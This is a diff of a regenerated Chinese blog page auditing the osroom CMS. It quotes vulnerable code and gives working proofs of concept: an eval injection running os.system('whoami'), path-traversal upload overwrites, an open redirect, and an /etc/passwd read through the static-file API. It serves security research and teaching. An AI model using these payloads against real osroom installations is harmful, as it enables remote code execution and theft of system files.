@@ -20,17 +20,27 @@
     <meta name="author" content="Misaki">
     <meta name="keywords" content="">
     <title>代码审计--osroom ~ Misaki&#39;s Blog</title>
-    <link rel="stylesheet" href="/css/Material_Icons.css">
-    <!-- <link rel="stylesheet" href="/css/font-awesome.css"> -->
+    
+<link rel="stylesheet" href="/css/Material_Icons.css">
+
+    <!-- 
+<link rel="stylesheet" href="/css/font-awesome.css">
+ -->
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css">
-    <link rel="stylesheet" href="/css/main.css">
     
-        <link rel="stylesheet" href="/css/post.css">
+<link rel="stylesheet" href="/css/main.css">
+
+    
         
-            <link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
+<link rel="stylesheet" href="/css/post.css">
+
+        
+            
+<link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
+
         
     
-</head>
+<meta name="generator" content="Hexo 5.2.0"></head>
 
 <body class=" sidebar-collapse">
 <nav class="navbar navbar-transparent navbar-color-on-scroll fixed-top navbar-expand-lg" color-on-scroll="100" id="sectionsNav">
@@ -115,7 +125,7 @@
               <h2 id="osroom"><a href="#osroom" class="headerlink" title="osroom"></a>osroom</h2><p>这个cms很有意思，从漏洞和程序的写法上，很适合用来入门学习，漏洞的一些形式相比来说，也比较多一点。</p>
 <h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p><code>apps\utils\format\obj_format.py</code></p>
 <p>如下，文件中采用了eval来转换字符串对象，当json.loads转换失败的时候，则直接使用eval来转换。</p>
-<pre><code>def json_to_pyseq(tjson):
+<pre class="line-numbers language-none"><code class="language-none">def json_to_pyseq(tjson):
     &quot;&quot;&quot;
     json to python sequencer
     :param json:
@@ -123,53 +133,56 @@
     &quot;&quot;&quot;
     if tjson in [None, &quot;None&quot;]:
         return None
-    elif not isinstance(tjson, (list, dict, tuple)) and tjson != &quot;&quot;:
-        if isinstance(tjson, (str, bytes)) and tjson[0] not in [&quot;{&quot;, &quot;[&quot;, &quot;(&quot;]:
+    elif not isinstance(tjson, (list, dict, tuple)) and tjson !&#x3D; &quot;&quot;:
+        if isinstance(tjson, (str, bytes)) and tjson[0] not in [&quot;&#123;&quot;, &quot;[&quot;, &quot;(&quot;]:
             return tjson
         elif isinstance(tjson, (int, float)):
             return tjson
         try:
-            tjson = json.loads(tjson)
+            tjson &#x3D; json.loads(tjson)
         except BaseException:
-            tjson = eval(tjson)
+            tjson &#x3D; eval(tjson)
         else:
             if isinstance(tjson, str):
-                tjson = eval(tjson)
-    return tjson
-</code></pre><p>转到一个使用此方法的功能，例如<code>apps\modules\audit\process\rules.py</code></p>
+                tjson &#x3D; eval(tjson)
+    return tjson<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>转到一个使用此方法的功能，例如<code>apps\modules\audit\process\rules.py</code></p>
 <p>删除规则处，传入一个ids参数，原参数值是一个hash值，但是可以修改为python代码。</p>
-<pre><code>def audit_rule_delete():
+<pre class="line-numbers language-none"><code class="language-none">def audit_rule_delete():
 
-    ids = json_to_pyseq(request.argget.all(&#39;ids&#39;, []))
+    ids &#x3D; json_to_pyseq(request.argget.all(&#39;ids&#39;, []))
     if not isinstance(ids, list):
-        ids = json.loads(ids)
+        ids &#x3D; json.loads(ids)
     for i, tid in enumerate(ids):
-        ids[i] = ObjectId(tid)
+        ids[i] &#x3D; ObjectId(tid)
 
-    r = mdbs[&quot;sys&quot;].db.audit_rules.delete_many({&quot;_id&quot;: {&quot;$in&quot;: ids}})
+    r &#x3D; mdbs[&quot;sys&quot;].db.audit_rules.delete_many(&#123;&quot;_id&quot;: &#123;&quot;$in&quot;: ids&#125;&#125;)
     if r.deleted_count &gt; 0:
-        data = {&quot;msg&quot;: gettext(&quot;Delete the success,{}&quot;).format(
-            r.deleted_count), &quot;msg_type&quot;: &quot;s&quot;, &quot;custom_status&quot;: 204}
+        data &#x3D; &#123;&quot;msg&quot;: gettext(&quot;Delete the success,&#123;&#125;&quot;).format(
+            r.deleted_count), &quot;msg_type&quot;: &quot;s&quot;, &quot;custom_status&quot;: 204&#125;
     else:
-        data = {
+        data &#x3D; &#123;
             &quot;msg&quot;: gettext(&quot;Delete failed&quot;),
             &quot;msg_type&quot;: &quot;w&quot;,
-            &quot;custom_status&quot;: 400}
-    return data
-</code></pre><p>参数POC：<code>{123:__import__(&#39;os&#39;).system(&#39;whoami&#39;)}</code>，查看终端输出。</p>
+            &quot;custom_status&quot;: 400&#125;
+    return data<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>参数POC：<code> &#123;123:__import__(&#39;os&#39;).system(&#39;whoami&#39;)&#125;</code>，查看终端输出。</p>
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20201112124711645.png" alt="image-20201112124711645"></p>
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20201112121033287.png" alt="image-20201112121033287"></p>
 <p>只要涉及到ids参数的都存在此问题，比如另一个类别删除功能。</p>
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20201112133809406.png" alt="image-20201112133809406"></p>
 <p>在用户登陆的判断中，也对传入的参数<code>code_url_obj</code>执行了此方法，所以存在一个前台的RCE</p>
 <p><code>apps\modules\user\process\online.py</code></p>
-<pre><code>code_url_obj = json_to_pyseq(request.argget.all(&#39;code_url_obj&#39;, {}))
-</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20201112162057637.png" alt="image-20201112162057637"></p>
+<pre class="line-numbers language-none"><code class="language-none">code_url_obj &#x3D; json_to_pyseq(request.argget.all(&#39;code_url_obj&#39;, &#123;&#125;))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20201112162057637.png" alt="image-20201112162057637"></p>
 <h3 id="文件覆盖"><a href="#文件覆盖" class="headerlink" title="文件覆盖"></a>文件覆盖</h3><p><code>apps\utils\upload\file_up.py</code></p>
 <p>ps: 此问题没有复现，理论上存在。</p>
 <p>代码描述了一种上传typroa图像base64后处理来保存写入文件的方式，其中后缀是解析typroa图像base64开头得到，例如</p>
 <p><code>data:image/jpg;base64,</code>获得后缀为jpg，在后续的文件明拼接中，文件名被以时间戳和UUID重写构造，但是后缀可控，可以写入<code>..\..\</code>形式的遍历<code>data:image/jpg\..\..\..\..\tmp;base64</code></p>
-<pre><code>def fileup_base_64(uploaded_files, file_name=None, prefix=&quot;&quot;):
+<pre class="line-numbers language-none"><code class="language-none">def fileup_base_64(uploaded_files, file_name&#x3D;None, prefix&#x3D;&quot;&quot;):
     &quot;&quot;&quot;
      文件以base64编码上传上传
     :param uploaded_files: 数组
@@ -180,146 +193,151 @@
     if not uploaded_files:
         return None
 
-    keys = []
+    keys &#x3D; []
     for file_base in uploaded_files:
         if file_base:
-            # data:image/jpeg
-            file_format = file_base.split(&quot;;&quot;)[0].split(&quot;/&quot;)[-1]
-            imgdata = base64.b64decode(file_base.split(&quot;,&quot;)[-1])
+            # data:image&#x2F;jpeg
+            file_format &#x3D; file_base.split(&quot;;&quot;)[0].split(&quot;&#x2F;&quot;)[-1]
+            imgdata &#x3D; base64.b64decode(file_base.split(&quot;,&quot;)[-1])
             if file_name:
-                filename = &#39;{}.{}&#39;.format(file_name, file_format)
+                filename &#x3D; &#39;&#123;&#125;.&#123;&#125;&#39;.format(file_name, file_format)
             else:
-                filename = &#39;{}_{}.{}&#39;.format(
+                filename &#x3D; &#39;&#123;&#125;_&#123;&#125;.&#123;&#125;&#39;.format(
                     time_to_utcdate(
-                        time_stamp=time.time(),
-                        tformat=&quot;%Y%m%d%H%M%S&quot;),
+                        time_stamp&#x3D;time.time(),
+                        tformat&#x3D;&quot;%Y%m%d%H%M%S&quot;),
                     uuid1(),
-                    file_format)
-</code></pre><p>传入后可以造成一种保存文件到其他目录的效果，这种遍历在Linux下是不允许的，但在Windows下可执行，win支持及<code>../</code>和<code>..\</code>，还可以文件结尾的回退遍历，所以在Windows下可以造成覆写。</p>
+                    file_format)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>传入后可以造成一种保存文件到其他目录的效果，这种遍历在Linux下是不允许的，但在Windows下可执行，win支持及<code>../</code>和<code>..\</code>，还可以文件结尾的回退遍历，所以在Windows下可以造成覆写。</p>
 <p>由于兼容性，Windows下有个别的包兼容有问题，并没有复现，附一张Linux的目录构造图</p>
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20201112155343443.png" alt="image-20201112155343443"></p>
 <h3 id="上传文件覆盖"><a href="#上传文件覆盖" class="headerlink" title="上传文件覆盖"></a>上传文件覆盖</h3><p>如果上面那个不是很清楚，这个就比较明显了，插件上传功能中。</p>
 <p><code>apps\modules\plug_in_manager\process\manager.py</code></p>
-<pre><code>def upload_plugin():
+<pre class="line-numbers language-none"><code class="language-none">def upload_plugin():
     &quot;&quot;&quot;
     插件上传
     :return:
     &quot;&quot;&quot;
 
-    file = request.files[&quot;upfile&quot;]
-    file_name = os.path.splitext(file.filename)         #(&#39;123&#39;,&#39;.zip&#39;)
-    filename = os.path.splitext(file.filename)[0]         #123
-    extension = file_name[1]                           #.zip
+    file &#x3D; request.files[&quot;upfile&quot;]
+    file_name &#x3D; os.path.splitext(file.filename)         #(&#39;123&#39;,&#39;.zip&#39;)
+    filename &#x3D; os.path.splitext(file.filename)[0]         #123
+    extension &#x3D; file_name[1]                           #.zip
     if not extension.strip(&quot;.&quot;).lower() in [&quot;zip&quot;]:
-        data = {&quot;msg&quot;: gettext(&quot;File format error, please upload zip archive&quot;),
-                &quot;msg_type&quot;: &quot;w&quot;, &quot;custom_status&quot;: 401}
+        data &#x3D; &#123;&quot;msg&quot;: gettext(&quot;File format error, please upload zip archive&quot;),
+                &quot;msg_type&quot;: &quot;w&quot;, &quot;custom_status&quot;: 401&#125;
         return data
 
-    if not os.path.exists(PLUG_IN_FOLDER):            #osroom/apps/plugins
+    if not os.path.exists(PLUG_IN_FOLDER):            #osroom&#x2F;apps&#x2F;plugins
         os.makedirs(PLUG_IN_FOLDER)
 
-    fpath = os.path.join(PLUG_IN_FOLDER, filename)   ##osroom/apps/plugins/123
+    fpath &#x3D; os.path.join(PLUG_IN_FOLDER, filename)   ##osroom&#x2F;apps&#x2F;plugins&#x2F;123
     if os.path.isdir(fpath) or os.path.exists(fpath):
         if mdbs[&quot;sys&quot;].db.plugin.find_one(
-                {&quot;plugin_name&quot;: filename, &quot;is_deleted&quot;: {&quot;$in&quot;: [0, False]}}):
+                &#123;&quot;plugin_name&quot;: filename, &quot;is_deleted&quot;: &#123;&quot;$in&quot;: [0, False]&#125;&#125;):
             # 如果插件没有准备删除标志
-            data = {&quot;msg&quot;: gettext(&quot;The same name plugin already exists&quot;),
-                    &quot;msg_type&quot;: &quot;w&quot;, &quot;custom_status&quot;: 403}
+            data &#x3D; &#123;&quot;msg&quot;: gettext(&quot;The same name plugin already exists&quot;),
+                    &quot;msg_type&quot;: &quot;w&quot;, &quot;custom_status&quot;: 403&#125;
             return data
         else:
             # 否则清除旧的插件
             shutil.rmtree(fpath)
-            mdbs[&quot;sys&quot;].db.plugin.update_one({&quot;plugin_name&quot;: filename}, {
-                                         &quot;$set&quot;: {&quot;is_deleted&quot;: 0}})
+            mdbs[&quot;sys&quot;].db.plugin.update_one(&#123;&quot;plugin_name&quot;: filename&#125;, &#123;
+                                         &quot;$set&quot;: &#123;&quot;is_deleted&quot;: 0&#125;&#125;)
 
     # 保存主题
-    save_file = os.path.join(&quot;{}/{}&quot;.format(PLUG_IN_FOLDER, file.filename))     ##osroom/apps/plugins/123.zip
-    file.save(save_file)
-</code></pre><p>上传文件后分割文件和后缀，判断插件是否存在以及是否清理就插件，在下面保存的时候，直接使用了上传的参数名做拼接，导致可以被跨目录保存，比如文件应该保存到<code>osroom/apps/plugins/</code>下，上传如下</p>
+    save_file &#x3D; os.path.join(&quot;&#123;&#125;&#x2F;&#123;&#125;&quot;.format(PLUG_IN_FOLDER, file.filename))     ##osroom&#x2F;apps&#x2F;plugins&#x2F;123.zip
+    file.save(save_file)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>上传文件后分割文件和后缀，判断插件是否存在以及是否清理就插件，在下面保存的时候，直接使用了上传的参数名做拼接，导致可以被跨目录保存，比如文件应该保存到<code>osroom/apps/plugins/</code>下，上传如下</p>
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20201113142316180.png" alt="image-20201113142316180"></p>
 <p>我们在系统查看</p>
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20201113142402087.png" alt="image-20201113142402087"></p>
 <h3 id="路径跳转"><a href="#路径跳转" class="headerlink" title="路径跳转"></a>路径跳转</h3><p><code>apps\modules\user\process\sign_in.py</code></p>
 <p>ps：此问题影响较小，当作分析即可</p>
 <p>在代码中存在一个获取值的参数<code>next</code>，这个参数是登陆的时候默认没有存在，可能是为了跳转登陆留下的参数。参数值为任意值的时候，返回的<code>to_url</code>的值就为参数值。</p>
-<pre><code>def p_sign_in(
+<pre class="line-numbers language-none"><code class="language-none">def p_sign_in(
         username,
         password,
         code_url_obj,
         code,
         remember_me,
-        use_jwt_auth=0):
+        use_jwt_auth&#x3D;0):
     &quot;&quot;&quot;
     用户登录函数
     :param adm:
     :return:
     &quot;&quot;&quot;
-    data = {}
+    data &#x3D; &#123;&#125;
     if current_user.is_authenticated and username in [current_user.username,
                                                       current_user.email,
                                                       current_user.mphone_num]:
-        data[&#39;msg&#39;] = gettext(&quot;Is logged in&quot;)
-        data[&quot;msg_type&quot;] = &quot;s&quot;
-        data[&quot;custom_status&quot;] = 201
-        data[&#39;to_url&#39;] = request.argget.all(
+        data[&#39;msg&#39;] &#x3D; gettext(&quot;Is logged in&quot;)
+        data[&quot;msg_type&quot;] &#x3D; &quot;s&quot;
+        data[&quot;custom_status&quot;] &#x3D; 201
+        data[&#39;to_url&#39;] &#x3D; request.argget.all(
             &#39;next&#39;) or get_config(&quot;login_manager&quot;, &quot;LOGIN_IN_TO&quot;)
-        return data
-</code></pre><p>然后在前端js中<code>apps\admin_pages\pages\sign-in.html</code></p>
-<p>直接获取响应的data的to_url进行跳转，类似于统一登陆中的任意域跳转的问题。</p>
-<pre><code>         var result = osrHttp(&quot;PUT&quot;,&quot;/api/sign-in&quot;, d);
-         result.then(function (r) {
-                if(r.data.msg_type==&quot;s&quot;){
-                    window.location.href = r.data/to_url;
+        return data<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-                }else if(r.data.open_img_verif_code){
-                    get_imgcode();
-                }
-         }).catch(function (r) {
-            if(r.data.open_img_verif_code){
-                get_imgcode();
-            }
-         });
-</code></pre><h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p><code>apps\modules\theme_setting\process\static_file.py</code></p>
+<p>然后在前端js中<code>apps\admin_pages\pages\sign-in.html</code></p>
+<p>直接获取响应的data的to_url进行跳转，类似于统一登陆中的任意域跳转的问题。</p>
+<pre class="line-numbers language-none"><code class="language-none">var result &#x3D; osrHttp(&quot;PUT&quot;,&quot;&#x2F;api&#x2F;sign-in&quot;, d);
+      result.then(function (r) &#123;
+             if(r.data.msg_type&#x3D;&#x3D;&quot;s&quot;)&#123;
+                 window.location.href &#x3D; r.data&#x2F;to_url;
+
+             &#125;else if(r.data.open_img_verif_code)&#123;
+                 get_imgcode();
+             &#125;
+      &#125;).catch(function (r) &#123;
+         if(r.data.open_img_verif_code)&#123;
+             get_imgcode();
+         &#125;
+      &#125;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p><code>apps\modules\theme_setting\process\static_file.py</code></p>
 <p>读取静态文件模板的时候，直接使用了请求的参数进行拼接访问，导致可以任意读取文件</p>
-<pre><code>def get_static_file_content():
+<pre class="line-numbers language-none"><code class="language-none">def get_static_file_content():
     &quot;&quot;&quot;
     获取静态文件内容, 如html文件
     :return:
     &quot;&quot;&quot;
-    filename = request.argget.all(&#39;filename&#39;, &quot;index&quot;).strip(&quot;/&quot;)
-    file_path = request.argget.all(&#39;file_path&#39;, &quot;&quot;).strip(&quot;/&quot;)
-    theme_name = request.argget.all(&quot;theme_name&quot;)
+    filename &#x3D; request.argget.all(&#39;filename&#39;, &quot;index&quot;).strip(&quot;&#x2F;&quot;)
+    file_path &#x3D; request.argget.all(&#39;file_path&#39;, &quot;&quot;).strip(&quot;&#x2F;&quot;)
+    theme_name &#x3D; request.argget.all(&quot;theme_name&quot;)
 
-    s, r = arg_verify([(gettext(&quot;theme name&quot;), theme_name)], required=True)
+    s, r &#x3D; arg_verify([(gettext(&quot;theme name&quot;), theme_name)], required&#x3D;True)
     if not s:
         return r
-    path = os.path.join(
+    path &#x3D; os.path.join(
         THEME_TEMPLATE_FOLDER, theme_name)
-    file = &quot;{}/{}/{}&quot;.format(path, file_path, filename)
+    file &#x3D; &quot;&#123;&#125;&#x2F;&#123;&#125;&#x2F;&#123;&#125;&quot;.format(path, file_path, filename)
     if not os.path.exists(file) or THEME_TEMPLATE_FOLDER not in file:
-        data = {&quot;msg&quot;: gettext(&quot;File not found,&#39;{}&#39;&quot;).format(file),
-                &quot;msg_type&quot;: &quot;w&quot;, &quot;custom_status&quot;: 404}
+        data &#x3D; &#123;&quot;msg&quot;: gettext(&quot;File not found,&#39;&#123;&#125;&#39;&quot;).format(file),
+                &quot;msg_type&quot;: &quot;w&quot;, &quot;custom_status&quot;: 404&#125;
     else:
         with open(file) as wf:
-            content = wf.read()
-        data = {
+            content &#x3D; wf.read()
+        data &#x3D; &#123;
             &quot;content&quot;: content,
             &quot;file_relative_path&quot;: file_path.replace(
                 path,
-                &quot;&quot;).strip(&quot;/&quot;)}
-    return data
-</code></pre><p>构造POC：<code>http://192.168.120.128:5000/api/admin/static/file?file_path=pages/account/settings/../../../../../../../../etc&amp;filename=passwd&amp;theme_name=osr-theme-w</code></p>
+                &quot;&quot;).strip(&quot;&#x2F;&quot;)&#125;
+    return data<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>构造POC：<code>http://192.168.120.128:5000/api/admin/static/file?file_path=pages/account/settings/../../../../../../../../etc&amp;filename=passwd&amp;theme_name=osr-theme-w</code></p>
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20201112174207578.png" alt="image-20201112174207578"></p>
 
           </div>
           <br><br>
               
                 <div class="license-wrapper">
-                    <p>原文作者：<a href="">Misaki</a>
-                    <p>原文链接：<a href="/2020/11/代码审计-osroom/">/2020/11/代码审计-osroom/</a>
-                    <p>发表日期：<a href="/2020/11/代码审计-osroom/">November 20th 2020, 3:24:45 pm</a>
-                    <p>更新日期：<a href="/2020/11/代码审计-osroom/">November 20th 2020, 3:26:48 pm</a>
-                    <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+                    <p>原文作者：<a href="https://misakikata.github.io">Misaki</a>
+                    <p>原文链接：<a href="https://misakikata.github.io/2020/11/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-osroom/">https://misakikata.github.io/2020/11/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-osroom/</a>
+                    <p>发表日期：<a href="https://misakikata.github.io/2020/11/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-osroom/">November 20th 2020, 3:24:45 pm</a>
+                    <p>更新日期：<a href="https://misakikata.github.io/2020/11/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-osroom/">November 20th 2020, 3:26:48 pm</a>
+                    <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
                 </div>
               
           <br><br>
@@ -360,7 +378,7 @@
     <script>               
         var disqus_shortname = '';
         var disqus_config = function () {
-            this.page.url = '/2020/11/代码审计-osroom/'; 
+            this.page.url = 'https://misakikata.github.io/2020/11/代码审计-osroom/'; 
             this.page.identifier = '/2020/11/代码审计-osroom/';
         };
         (function() { 
@@ -371,7 +389,7 @@
             (d.head || d.body).appendChild(s);
         })();
     </script>
-    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>                                
+    <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>                                
 </div>
         
     
@@ -391,16 +409,32 @@
         </div>
 </footer>
       <!--   Core JS Files   -->
-      <script src="/js/core/jquery.min.js?v=3.2.1"></script>
-      <script src="/js/main.js"></script>
-      <script src="/js/core/popper.min.js"></script>
-      <script src="/js/core/bootstrap-material-design.min.js"></script>
-      <script src="/js/plugins/moment.min.js"></script>
-      <script src="/js/material-kit.min.js?v=2.0.5"></script>
+      
+<script src="/js/core/jquery.min.js?v=3.2.1.js"></script>
+
+      
+<script src="/js/main.js"></script>
+
+      
+<script src="/js/core/popper.min.js"></script>
+
+      
+<script src="/js/core/bootstrap-material-design.min.js"></script>
+
+      
+<script src="/js/plugins/moment.min.js"></script>
+
+      
+<script src="/js/material-kit.min.js?v=2.0.5.js"></script>
+
       
         <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
-        <script src="/js/post.js"></script>
-        <script src="/js/plugins/prettify.js"></script>
+        
+<script src="/js/post.js"></script>
+
+        
+<script src="/js/plugins/prettify.js"></script>
+
         <script>
             $(document).ready(function(){
                 $('pre').addClass('prettyprint linenums');
